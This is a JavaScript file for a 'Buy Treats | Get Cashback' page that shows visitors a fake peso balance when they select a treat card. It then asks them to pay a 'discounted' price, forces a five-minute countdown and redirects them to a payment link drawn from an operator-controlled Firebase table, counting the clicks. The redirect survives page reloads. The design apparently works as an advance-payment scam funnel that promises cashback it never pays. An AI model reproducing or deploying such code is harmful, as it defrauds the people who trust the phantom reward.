/* ============================================
   BUY TREATS | GET CASHBACK - MAIN SCRIPT
   ============================================ */

(function() {
  'use strict';

  // ===== CARD DATA =====
  const cardData = {
    1: {
      img: 'photos/1500iva.png',
      badge: '₱1,500',
      discount: '-22%',
      oldPrice: '₱700',
      newPrice: '545',
      amount: 1500,
      type: 'treat1'
    },
    2: {
      img: 'photos/3000iva.png',
      badge: '₱3,000',
      discount: '-28%',
      oldPrice: '₱1,500',
      newPrice: '1,080',
      amount: 3000,
      type: 'treat2'
    }
  };

  // ===== USER DATA =====
  const userPhone = localStorage.getItem('user_phone') || '09171234567';

  // ===== DOM REFERENCES =====
  const profileImg = document.getElementById('profileImg');
  const projectorImg = document.getElementById('projectorImg');
  const photoWrapper = document.getElementById('photoWrapper');
  const typedSpan = document.getElementById('typedText');
  const balanceElement = document.getElementById('balanceAmount');
  const claimNowBtn = document.getElementById('claimNowBtn');

  // Card Popup Elements
  const cardPopupOverlay = document.getElementById('cardPopupOverlay');
  const cardPopupClose = document.getElementById('cardPopupClose');
  const cardPopupImage = document.getElementById('cardPopupImage');
  const cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
  const cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
  const cardPopupDiscount = document.getElementById('cardPopupDiscount');
  const cardPopupReward = document.getElementById('cardPopupReward');
  const cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');

  // Claim Popup Elements
  const claimPopupOverlay = document.getElementById('claimPopupOverlay');
  const claimPopupClose = document.getElementById('claimPopupClose');
  const claimPopupImage = document.getElementById('claimPopupImage');
  const claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
  const claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
  const claimPopupDiscount = document.getElementById('claimPopupDiscount');
  const claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount');
  const claimPopupPhone = document.getElementById('claimPopupPhone');
  const claimPayBtn = document.getElementById('claimPayBtn');
  const claimTimerDisplay = document.getElementById('claimTimerDisplay');

  // ===== STATE =====
  let selectedCard = null;
  let currentBalance = 0;
  let cardPopupNumber = null;
  let timerInterval = null;
  let timeRemaining = 0;
  let isTimerRunning = false;
  let treatLink = null;
  let isRedirecting = false;
  let pendingRedirect = false;

  // ===== FIREBASE REFERENCE =====
  const database = firebase.database();

  // ===== HELPER: Format number with commas =====
  function formatWithCommas(number) {
    return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  }

  // ===== CHECK FOR DEPLOYED LINK =====
  async function checkForDeployedLink(treatType) {
    try {
      console.log('🔍 Checking for deployed link for:', treatType);
      const snapshot = await database.ref('treat_links')
        .orderByChild('type')
        .equalTo(treatType)
        .once('value');
      
      const links = snapshot.val();
      if (links) {
        const linkIds = Object.keys(links);
        const latestId = linkIds[linkIds.length - 1];
        const linkData = links[latestId];
        
        // Increment click count
        const newClickCount = (linkData.clicks || 0) + 1;
        await database.ref('treat_links/' + latestId + '/clicks').set(newClickCount);
        
        console.log('✅ Link found:', linkData.url);
        return linkData.url;
      } else {
        console.log('❌ No link deployed for this treat');
        return null;
      }
    } catch (error) {
      console.error('❌ Error checking for link:', error);
      return null;
    }
  }

  // ===== CHECK PERSISTENT TIMER ON LOAD =====
  function checkPersistentTimer() {
    const timerData = localStorage.getItem('treat_timer');
    if (!timerData) return false;
    
    try {
      const data = JSON.parse(timerData);
      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
      const remaining = data.duration - elapsed;
      
      console.log('⏰ Persistent timer found:', { elapsed, remaining, duration: data.duration });
      
      if (remaining > 0) {
        // Timer is still running
        timeRemaining = remaining;
        isTimerRunning = true;
        selectedCard = data.selectedCard;
        treatLink = data.treatLink;
        
        // Update balance
        const cardNumber = parseInt(selectedCard.replace('card', ''));
        if (cardNumber && cardData[cardNumber]) {
          currentBalance = cardData[cardNumber].amount;
          updateBalance(currentBalance, true);
        }
        
        // Start timer display
        startTimerDisplay(remaining);
        
        // Check if redirect is pending
        if (data.pendingRedirect && data.treatLink) {
          pendingRedirect = true;
          // Auto-redirect after checking
          setTimeout(() => {
            if (data.treatLink) {
              window.location.href = data.treatLink;
            }
          }, 1000);
        }
        
        return true;
      } else {
        // Timer expired - clear storage and check for redirect
        localStorage.removeItem('treat_timer');
        if (data.treatLink && data.pendingRedirect) {
          // Auto-redirect to the link
          window.location.href = data.treatLink;
        }
        return false;
      }
    } catch (e) {
      console.error('Error parsing timer data:', e);
      localStorage.removeItem('treat_timer');
      return false;
    }
  }

  // ===== START TIMER DISPLAY =====
  function startTimerDisplay(seconds) {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
    
    if (claimTimerDisplay) {
      claimTimerDisplay.textContent = timeStr;
    }
    
    claimPayBtn.classList.add('disabled');
    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
  }

  // ===== SAVE TIMER STATE =====
  function saveTimerState(duration, link, cardId) {
    const timerData = {
      startTime: Date.now(),
      duration: duration,
      selectedCard: cardId,
      treatLink: link,
      pendingRedirect: !!link
    };
    localStorage.setItem('treat_timer', JSON.stringify(timerData));
    console.log('💾 Timer state saved:', timerData);
  }

  // ===== IMAGE ERROR HANDLING =====
  profileImg.addEventListener('error', function() {
    this.style.display = 'none';
    this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
    this.parentElement.style.display = 'flex';
    this.parentElement.style.alignItems = 'center';
    this.parentElement.style.justifyContent = 'center';
    const placeholder = document.createElement('span');
    placeholder.textContent = '👤';
    placeholder.style.fontSize = '2.5rem';
    placeholder.style.color = '#ffffff';
    placeholder.style.opacity = '0.6';
    this.parentElement.appendChild(placeholder);
  });

  projectorImg.addEventListener('error', function() {
    this.style.display = 'none';
    this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
    this.parentElement.style.display = 'flex';
    this.parentElement.style.alignItems = 'center';
    this.parentElement.style.justifyContent = 'center';
    const placeholder = document.createElement('span');
    placeholder.textContent = '👤';
    placeholder.style.fontSize = '4rem';
    placeholder.style.color = '#ffffff';
    placeholder.style.opacity = '0.6';
    this.parentElement.appendChild(placeholder);
  });

  // ===== THOUGHT BUBBLE TYPEWRITER =====
  const messages = [
    "🎄 Advance Merry Christmas! 🎅",
    "Earn cashback on every treat you buy! 💰",
    "Your balance is ready to use! ✨",
    "Buy Treats & Get Cashback! 🎁"
  ];
  let messageIndex = 0;
  let charIndex = 0;
  let isDeleting = false;
  let typingSpeed = 36;

  function typeEffect() {
    const currentMessage = messages[messageIndex];
    if (!isDeleting) {
      typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
      charIndex++;
      if (charIndex === currentMessage.length) {
        setTimeout(() => { isDeleting = true; typeEffect(); }, 2800);
        return;
      }
      setTimeout(typeEffect, typingSpeed + Math.random() * 18);
    } else {
      typedSpan.textContent = currentMessage.substring(0, charIndex - 1);
      charIndex--;
      if (charIndex === 0) {
        isDeleting = false;
        messageIndex = (messageIndex + 1) % messages.length;
        setTimeout(typeEffect, 500);
        return;
      }
      setTimeout(typeEffect, typingSpeed * 0.3);
    }
  }
  setTimeout(typeEffect, 600);

  // ===== PROJECTOR ZOOM - TAP TOGGLE =====
  photoWrapper.addEventListener('click', function(e) {
    e.stopPropagation();
    this.classList.toggle('active');
  });

  document.addEventListener('click', function(e) {
    if (!photoWrapper.contains(e.target)) {
      photoWrapper.classList.remove('active');
    }
  });

  // ===== BALANCE UPDATE =====
  function updateBalance(newAmount, isIncrement) {
    const amountSpan = balanceElement;
    amountSpan.classList.remove('increment', 'decrement');
    void amountSpan.offsetWidth;
    amountSpan.textContent = formatWithCommas(newAmount) + '.00';
    if (isIncrement) {
      amountSpan.classList.add('increment');
    } else {
      amountSpan.classList.add('decrement');
    }
    setTimeout(() => {
      amountSpan.classList.remove('increment', 'decrement');
    }, 700);
  }

  // ===== CARD SELECTION =====
  function selectCard(cardNumber) {
    const card = document.getElementById('card' + cardNumber);
    const btn = card.querySelector('.card-btn');
    const amount = cardData[cardNumber].amount;
    const cardId = 'card' + cardNumber;

    if (selectedCard === cardId) {
      card.classList.remove('selected');
      btn.classList.remove('selected-btn');
      btn.textContent = 'Select Treat';
      selectedCard = null;
      currentBalance = 0;
      updateBalance(0, false);
      return;
    }

    if (selectedCard !== null) {
      const prevCard = document.getElementById(selectedCard);
      const prevBtn = prevCard.querySelector('.card-btn');
      prevCard.classList.remove('selected');
      prevBtn.classList.remove('selected-btn');
      prevBtn.textContent = 'Select Treat';
    }

    card.classList.add('selected');
    btn.classList.add('selected-btn');
    btn.textContent = '✓ Selected';
    selectedCard = cardId;
    currentBalance = amount;
    updateBalance(amount, true);
  }
  window.selectCard = selectCard;

  // ===== CARD POPUP =====
  function openCardPopup(cardNumber) {
    cardPopupNumber = cardNumber;
    const data = cardData[cardNumber];
    
    cardPopupImage.src = data.img;
    cardPopupOldPrice.textContent = data.oldPrice;
    cardPopupNewPrice.textContent = data.newPrice;
    cardPopupDiscount.textContent = data.discount;
    cardPopupReward.textContent = formatWithCommas(parseInt(data.badge.replace('₱', '').replace(/,/g, '')));
    
    updateCardPopupButtonState();
    
    cardPopupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
  window.openCardPopup = openCardPopup;

  function closeCardPopup() {
    cardPopupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  function updateCardPopupButtonState() {
    const cardId = 'card' + cardPopupNumber;
    const card = document.getElementById(cardId);
    const isSelected = card.classList.contains('selected');
    
    if (isSelected) {
      cardPopupSelectBtn.classList.add('selected-popup');
      cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> ✓ Selected';
    } else {
      cardPopupSelectBtn.classList.remove('selected-popup');
      cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> Select Treat';
    }
  }

  function cardPopupSelectCard() {
    if (cardPopupNumber) {
      selectCard(cardPopupNumber);
      updateCardPopupButtonState();
      setTimeout(closeCardPopup, 400);
    }
  }

  // Card Popup Event Listeners
  cardPopupClose.addEventListener('click', closeCardPopup);
  cardPopupSelectBtn.addEventListener('click', cardPopupSelectCard);
  
  cardPopupOverlay.addEventListener('click', function(e) {
    if (e.target === cardPopupOverlay) {
      closeCardPopup();
    }
  });

  // ===== CLAIM POPUP =====
  function openClaimPopup() {
    if (selectedCard === null) {
      alert('💳 Please select a treat reward first!');
      return;
    }
    
    const cardNumber = parseInt(selectedCard.replace('card', ''));
    const data = cardData[cardNumber];
    const rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
    
    claimPopupImage.src = data.img;
    claimPopupOldPrice.textContent = data.oldPrice;
    claimPopupNewPrice.textContent = data.newPrice;
    claimPopupDiscount.textContent = data.discount;
    claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
    claimPopupPhone.textContent = userPhone;
    
    // Reset timer and check for link
    resetClaimTimer();
    treatLink = null;
    isRedirecting = false;
    pendingRedirect = false;
    
    // Check if there's a deployed link for this treat
    checkForDeployedLink(data.type).then(link => {
      treatLink = link;
      if (link) {
        console.log('🔗 Deployed link found:', link);
        claimPayBtn.innerHTML = '<i class="fas fa-link"></i> PAY TREATS <span class="timer-display" id="claimTimerDisplay"></span>';
      } else {
        console.log('ℹ️ No link deployed, timer will proceed normally');
      }
      updateClaimPopupButtonState();
    });
    
    claimPopupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function closeClaimPopup() {
    resetClaimTimer();
    claimPopupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  function updateClaimPopupButtonState() {
    if (selectedCard !== null) {
      claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS <span class="timer-display" id="claimTimerDisplay"></span>';
      claimPayBtn.classList.remove('disabled');
    } else {
      claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS <span class="timer-display" id="claimTimerDisplay"></span>';
      claimPayBtn.classList.remove('disabled');
    }
  }

  // ===== TIMER =====
  function startTimer() {
    if (selectedCard === null) {
      alert('💳 Please select a treat reward first!');
      return;
    }
    
    if (isTimerRunning) return;
    
    timeRemaining = 300;
    isTimerRunning = true;
    
    // Save timer state to localStorage
    saveTimerState(timeRemaining, treatLink, selectedCard);
    
    claimPayBtn.classList.add('disabled');
    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
    
    timerInterval = setInterval(function() {
      timeRemaining--;
      const minutes = Math.floor(timeRemaining / 60);
      const seconds = timeRemaining % 60;
      const timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
      
      const display = document.getElementById('claimTimerDisplay');
      if (display) {
        display.textContent = timeStr;
      }
      
      // Update localStorage every 5 seconds
      if (timeRemaining % 5 === 0) {
        saveTimerState(timeRemaining, treatLink, selectedCard);
      }
      
      if (timeRemaining <= 0) {
        clearInterval(timerInterval);
        timerInterval = null;
        isTimerRunning = false;
        
        // Clear timer from localStorage
        localStorage.removeItem('treat_timer');
        
        // Check if there's a link to redirect to
        if (treatLink && !isRedirecting) {
          isRedirecting = true;
          claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING... <span class="timer-display" id="claimTimerDisplay"></span>';
          
          // Show toast notification
          showToast('🔗 Redirecting to treat link...');
          
          // Redirect after a short delay
          setTimeout(function() {
            window.location.href = treatLink;
          }, 1500);
          
          return;
        }
        
        // No link found - proceed normally
        claimPayBtn.classList.remove('disabled');
        claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY NOW <span class="timer-display" id="claimTimerDisplay"></span>';
        alert('⏰ Time is up! You can now proceed.');
      }
    }, 1000);
  }

  function resetClaimTimer() {
    if (timerInterval) {
      clearInterval(timerInterval);
      timerInterval = null;
    }
    isTimerRunning = false;
    timeRemaining = 0;
    isRedirecting = false;
    pendingRedirect = false;
    localStorage.removeItem('treat_timer');
    claimPayBtn.classList.remove('disabled');
    const display = document.getElementById('claimTimerDisplay');
    if (display) {
      display.textContent = '';
    }
    updateClaimPopupButtonState();
  }

  // ===== SHOW TOAST =====
  function showToast(message, isError = false) {
    const existingToast = document.querySelector('.toast-message');
    if (existingToast) {
      existingToast.remove();
    }
    
    const toast = document.createElement('div');
    toast.className = 'toast-message' + (isError ? ' error' : '');
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
      toast.style.animation = 'toastSlideDown 0.3s ease';
      setTimeout(() => {
        toast.remove();
      }, 300);
    }, 3000);
  }

  // Claim Popup Event Listeners
  claimPopupClose.addEventListener('click', closeClaimPopup);
  claimPayBtn.addEventListener('click', startTimer);
  
  claimPopupOverlay.addEventListener('click', function(e) {
    if (e.target === claimPopupOverlay) {
      closeClaimPopup();
    }
  });

  // ===== HELP WIDGET =====
  window.openHelp = function() {
    window.open('https://facebook.com/FreeShoppingPH', '_blank');
  };

  // ===== CLAIM NOW BUTTON =====
  claimNowBtn.addEventListener('click', function() {
    if (currentBalance <= 0) {
      alert('💳 Please select a treat reward first!');
    } else {
      openClaimPopup();
    }
  });

  // ===== ESCAPE KEY =====
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      if (cardPopupOverlay.classList.contains('active')) {
        closeCardPopup();
      }
      if (claimPopupOverlay.classList.contains('active')) {
        closeClaimPopup();
      }
    }
  });

  // ===== INITIALIZE - CHECK PERSISTENT TIMER =====
  // Check if there's an active timer from previous session
  const hasActiveTimer = checkPersistentTimer();
  
  if (!hasActiveTimer) {
    console.log('ℹ️ No active timer found');
  }

  // Add toast styles if not already present
  const style = document.createElement('style');
  style.textContent = `
    .toast-message {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(3, 8, 7, 0.90);
      backdrop-filter: blur(16px);
      color: #fff;
      padding: 0.8rem 1.8rem;
      border-radius: 18px;
      border: 1px solid rgba(0, 180, 255, 0.10);
      font-family: 'Inter', sans-serif;
      font-size: 0.9rem;
      font-weight: 500;
      z-index: 9998;
      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
      animation: toastSlideUp 0.3s ease;
      max-width: 85%;
      text-align: center;
    }
    .toast-message.error {
      border-color: rgba(255, 50, 50, 0.15);
    }
    @keyframes toastSlideUp {
      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
      to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }
    @keyframes toastSlideDown {
      from { opacity: 1; transform: translateX(-50%) translateY(0); }
      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
    }
  `;
  document.head.appendChild(style);

  console.log('✅ Main.js initialized with persistent timer');
})();
